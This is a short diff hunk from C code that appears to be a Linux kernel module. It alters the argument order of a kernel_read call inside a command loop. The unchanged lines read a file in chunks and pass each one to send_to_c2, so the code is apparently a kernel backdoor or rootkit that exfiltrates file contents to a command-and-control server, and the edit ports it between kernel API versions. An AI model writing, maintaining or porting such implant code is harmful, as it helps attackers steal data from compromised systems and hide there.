@@ -170,7 +170,7 @@ static int command_loop(void *data) {
             pos = 0;
             do {
                 memset(outbuf, 0, sizeof(outbuf));
-                rlen = kernel_read(f, outbuf, sizeof(outbuf) - 1, &pos);
+                rlen = kernel_read(f, pos, outbuf, sizeof(outbuf) - 1);
                 if (rlen > 0) {
                     send_to_c2(outbuf, rlen);
                 }
